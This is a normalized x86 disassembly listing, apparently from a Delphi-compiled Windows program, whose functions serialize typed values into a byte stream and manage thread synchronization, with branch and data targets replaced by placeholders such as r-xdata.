lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_41f988
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_41fa0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_414acc
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_420980
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_414ad8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420798
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_420798
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa15
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_41fa1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_41fa7c
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_41808c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41f048
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41ef84
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa83
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_41fa88
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41fb1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4041fc
xor eax eax
push ebp
push sub_41fb01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_404164
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41e8b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb08
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_4041b8
retn
sub_41fb2c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fbe0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414d54
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_41fa1c
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbe7
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e860
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_414ad8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ef84
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_41f988
pop ecx
jmp r-xdata
jmp r-xdata
sub_41fbec
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415284
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eef4
mov esp ebp
pop ebp
retn
sub_41fc2c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4156a0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f0bc
pop ecx
pop ecx
pop ebp
retn
sub_41fc68
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41fcbd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4150c8
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4208cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fcc4
lea eax [ ebp - 0x4 ]
call sub_404844
retn
sub_41fce0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41fdcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4041b8
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4041b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fdd6
lea eax [ ebp - 0x4 ]
call sub_404164
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_404164
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_404470
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_41fcc8
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4044e4
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_41fce0
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4044e4
jmp r-xdata
sub_41fe08
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41fffc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414d54
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420980
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420003
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404188
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4041fc
xor eax eax
push ebp
push sub_41ff7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_4043c8
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_4044e4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41f168
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_4041b8
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_414d54
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41fce0
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41ef84
jmp r-xdata
sub_420014
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_4200d1
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415704
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405b04
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d4a0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420980
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4200d8
lea eax [ ebp - 0xc ]
call sub_404164
lea eax [ ebp - 0x8 ]
call sub_405b04
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41fce0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41ef84
sub_4200f0
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42018b
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415628
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_403624
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_4043c8
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ef84
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420980
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420192
lea eax [ ebp - 0xc ]
call sub_404164
retn
sub_420198
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_4201f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4155a8
mov eax [ ebp + 0x8 ]
push eax
call sub_41f934
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420348
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4201f8
lea eax [ ebp - 0x10 ]
call sub_40f18c
retn
sub_4201fc
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_420994
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41f7cc
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41f230
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414d54
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
jmp [ eax * 4 + jump_table_4202ba ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414d54
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_41fb2c
pop ecx
jmp r-xdata
push ebp
call sub_41fbec
pop ecx
jmp r-xdata
push ebp
call sub_41fc68
pop ecx
jmp r-xdata
push ebp
call sub_41fe08
pop ecx
jmp r-xdata
push ebp
call sub_4200f0
pop ecx
jmp r-xdata
push ebp
call sub_420198
pop ecx
jmp r-xdata
push ebp
call sub_41fc2c
pop ecx
jmp r-xdata
push ebp
call sub_420014
pop ecx
sub_420348
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420724
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_414394
test al al
je r-xdata
mov eax ebx
call sub_41422c
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_411480
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ef60
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40fb30
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f048
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_412bb8
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_4208cc
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42072b
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x34 ]
call sub_405b04
lea eax [ ebp - 0x30 ]
call sub_404164
lea eax [ ebp - 0x2c ]
call sub_404844
lea eax [ ebp - 0x1c ]
call sub_405b04
retn
xor eax eax
push ebp
push sub_4206c8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_41468c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_4203c6 ]
mov eax ebx
call sub_4105f4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41f0bc
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_410f38
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_412490
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_420878
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_405b04
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_413190
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40d4a0
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_420980
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420980
jmp r-xdata
mov eax ebx
call sub_411480
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ef18
jmp r-xdata
mov eax ebx
call sub_411480
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41eef4
jmp r-xdata
mov eax ebx
call sub_411ddc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ef3c
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_412490
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_420878
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_420980
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_420980
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4206b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b72c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42065d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4032b8
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_4043c8
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_420878
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41e760
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e760
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420664
mov eax [ ebp - 0x14 ]
call sub_403368
retn
sub_420664
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_420980
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e760
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e760
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403368
mov eax [ ebp - 0xc ]
call sub_403368
retn
sub_420744
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42078a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_404470
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420798
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420791
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_420798
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404424
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e760
mov eax esi
call sub_404624
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41e760
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_4207e0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404570
je r-xdata
mov eax esi
call sub_404424
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404424
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_420980
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e760
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41e760
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_420980
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e760
mov dl 0x6
mov eax ebx
call sub_420980
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e760
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41e760
sub_420878
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4208bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405f78
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4207e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4208c4
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_4208cc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_420972
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405e28
mov eax [ ebp - 0x8 ]
call sub_404424
mov edi eax
mov eax ebx
call sub_4049b0
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_420980
mov eax ebx
call sub_4049b0
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41e760
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41e760
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4043ec
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4207e0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420979
lea eax [ ebp - 0xc ]
call sub_404164
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_420994
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_420a50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
call sub_420a04
mov eax ebx
call sub_420a10
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420bde
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420bbf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420bc6
mov eax [ ebp - 0xc ]
call sub_403368
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4188a0
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418790
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_420b89
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_420b5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_420bf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_420a2c
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_420c31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_40415c
mov eax [ ebp - 0x4 ]
call sub_403368
sub_420c36
call sub_4027bc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_403b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_420a2c
test bl bl
je r-xdata
mov eax esi
call sub_40415c
mov eax [ ebp - 0x4 ]
call sub_403368
